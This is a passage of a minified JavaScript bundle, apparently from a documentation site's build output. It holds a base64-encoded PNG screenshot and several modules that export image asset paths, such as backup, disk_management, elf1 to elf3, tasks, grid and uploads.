a="data:image/png;base64,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nQCkEyCdpBMgnQCkEyCdAKQTIJ0ApBMgnaQTIJ0ApBMgnQCkEyCdpBMgnQCkEyCdAKQTIJ0ApBMgnaQTIJ0ApBMgnQCkEyCdpBMgnQCkEyCdAKQT8HanU4d0AqQTgHQCpBPAOaWTp+KAdAKQToB0ApBOgHQCkE6AdJJOgHQCkE6AdAKQToB0kk6AdAKQToB0ApBOgHQCkE6AdJJOgHQCkE6AdAKQToB0kk6AdAKQToB0ApBOgHQCkE6AdJJOgHQCkE6AdAKQToB0ApBOANIJkE4A0gmQTgDSCZBO0gmQTgDSCZBOANIJkE4A0gmQTtIJkE4A0gmQTgDSCZBO0gmQTgDSCZBOANIJuA7p1CGdAOkEIJ0A6QRwTunkqTggnQCkEyCdAKQTIJ0ApBMgnaQTIJ0ApBMgnQCkEyCdpBMgnQCkEyCdAKQTIJ0ApBMgnaQTIJ0ApBMgnQCkEyCdpBMgnQCkEyCdAKQTIJ0ApBMgnaQTIJ0ApBMgnQCkEyCdAKQTgHQCpBOAdAKkE4B0AqSTdAKkE4B0AqQTgHQCpBOAdAKkk3QCpBOAdAKkE4B0AqSTdAKkE4B0AqQTgHQCrkM6dUgnQDoBSCdAOgFIJ0A6AUgnQDpJJ0A6AUgnQDoBSCdAOgFIJwDpBEgnAOkESCcA6QRIJ+kESCcA6QRIJwDpBEgnAOkESCfpBEgnAOkESCcA6QRIJ+kESCcA6QRIJwDpBEgnAOkESCfpBEgnAOkESCcA6QRIJ+kESCcA6QRIJwDpBEgnAOkESCfpBEgnAOkESCcA6QRIJwDpBCCdAOkEIJ0A6QQgnQDp1EkngMs3RzoBvHbSCZBOANIJkE4A0gmQTgDSCUA6AdIJQDoB0glAOgHSCUA6AUgnQDoBSCdAOgFIJwDpBEgnAOkESCcA6QRIJwDpBCCdAOkEIJ0A6QQgnQCkEyCdAKQTIJ0ApBMgnQCkE4B0AqQTgHQCpBOAdAKQTsAVTieAq2cw+H9UTFh35FylggAAAGJlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAABJKGAAcAAAASAAAAUKABAAMAAAABAAEAAKACAAQAAAABAAAEnaADAAQAAAABAAABtQAAAABBU0NJSQAAAFNjcmVlbnNob3TvFSZlAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIzLTAxLTI1VDA5OjI1OjEyKzAwOjAwLoZv4QAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMy0wMS0yNVQwOToyNToxMiswMDowMF/b110AAAARdEVYdGV4aWY6Q29sb3JTcGFjZQAxD5sCSQAAABJ0RVh0ZXhpZjpFeGlmT2Zmc2V0ADI2UxuiZQAAABl0RVh0ZXhpZjpQaXhlbFhEaW1lbnNpb24AMTE4MXmCIC0AAAAYdEVYdGV4aWY6UGl4ZWxZRGltZW5zaW9uADQzN2i/pZAAAAAjdEVYdGV4aWY6VXNlckNvbW1lbnQAQVNDSUkuLi5TY3JlZW5zaG90K8iaSQAAABh0RVh0eG1wOlBpeGVsWERpbWVuc2lvbgAxMTgx6pHQ/QAAABd0RVh0eG1wOlBpeGVsWURpbWVuc2lvbgA0MzdysOgdAAAAGnRFWHR4bXA6VXNlckNvbW1lbnQAU2NyZWVuc2hvdNPgsnwAAAAASUVORK5CYII="},94698:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/backup-dfc157a3c5a19eba40d0099c05b2ae43.png"},71944:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/disk_management-87722e91028e7146b464d6ee61b1890d.png"},3561:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/elf1-6029e545760ed4eb36b5059fc9c3cde0.png"},26100:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/elf2-aa6d9d71c593261149480ddc0ad5f030.png"},91974:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/elf3-0b8207b5d7605af7950abeb7fbefdd28.png"},13654:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/tasks-b72c90d4cc74fb6ef0c11d09bdb9c355.png"},64127:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/grid-289e78d7a0b7abe41637032e64f882f8.png"},59507:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/uploads-f8dac5e837fa72d1d0c8dc12eadb66df.png"}}]);